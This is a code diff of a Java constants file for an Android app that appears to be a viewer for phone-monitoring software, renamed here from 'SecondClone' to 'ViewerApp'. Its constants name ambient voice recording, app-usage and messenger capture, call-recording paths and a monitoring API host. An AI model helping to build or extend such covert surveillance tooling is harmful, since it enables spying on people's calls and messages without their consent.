@@ -1,6 +1,6 @@
 /*
   ClassName: Global.java
-  @Project: SecondClone
+  @Project: ViewerApp
   @author  Lucas Walker (lucas.walker@jexpa.com)
   Created Date: 2018-06-05
   Description: Class Global is use to declare constant variables for other classes to call and use
@@ -25,7 +25,6 @@ public class Global {
     static final String VALUE_ACCEPT = "application/json";
     static final String CONTENT_TYPE = "Content-type";
     static final String VALUE_CONTENT_TYPE = "application/json";
-
 
     /**
      * MyDatabase
@@ -60,7 +59,6 @@ public class Global {
     public static final long HOUR_MILLIS = 1000 * 60 * 60;
     public static final String MIN_TIME = "2000-05-08 00:00:00";
 
-
     /**
      * Function Name of Feature
      */
@@ -74,7 +72,6 @@ public class Global {
     public static final String GET_AMBIENT_VOICE_RECORDING = "GetAmbients";
     public static final String GET_APPLICATION_USAGE = "GetApps";
     public static final String GET_NOTES_HISTORY = "GetNotes";
-
 
     /**
      * SharedPreferences
@@ -96,7 +93,6 @@ public class Global {
     public static final String HANGOUTS_TOTAL = "Hangouts_Total";
     public static final String MAPTYPE = "maptype";
 
-
     /**
      * SMS type
      */
@@ -110,7 +106,6 @@ public class Global {
     public static final String SMS_BBM_TYPE = "10";
     public static final String SMS_LINE_TYPE = "11";
     public static final String SMS_KIK_TYPE = "12";
-
 
     /**
      * Value variable of intent class MainActivity.
@@ -131,14 +126,14 @@ public class Global {
      * Distributing
      */
 
-    public static String DEFAULT_PROTOCOL_LINK = "http://protocol.secondclone.uss/api/apiv2";
+    public static String DEFAULT_PROTOCOL_LINK = "http://monitor-protocol-a.secondclone.com/api/apiv2";
     public static String DEFAULT_LINK_FORGETPASSWORD = "http://my.secondclone.us/Account/ForgotPassword";
     public static String DEFAULT_LINK_ABOUTUS = "http://secondclone.us/about-us/";
     public static String DEFAULT_LINK_REGISTER = "http://my.secondclone.us/Account/SignUp";
     public static String DEFAULT_LINK_RENEW = "http://my.secondclone.us/Prices";
-    public static String DEFAULT_PRODUCT_NAME = "SecondClone";
+    public static String DEFAULT_PRODUCT_NAME = "ViewerApp";
     public static String DEFAULT_VERSION_NAME = "1.01.16";
-    public static String DEFAULT_COPYRIGHT = "Copyright © 2010-2018 SecondClone. All rights reserved";
+    public static String DEFAULT_COPYRIGHT = "Copyright © 2010-2020 SecondClone. All rights reserved";
     public static String DEFAULT_LOGO_IMAGE_PATH = "http://my.secondclone.us/favicon.ico";
     public static final String File_PATH_SAVE_PHONE_CALL_RECORD = Environment.getExternalStorageDirectory() + "/" + DEFAULT_PRODUCT_NAME;
     public static final String File_PATH_SAVE_IMAGE = Environment.getExternalStorageDirectory() + "/" + DEFAULT_PRODUCT_NAME + "/Picture";
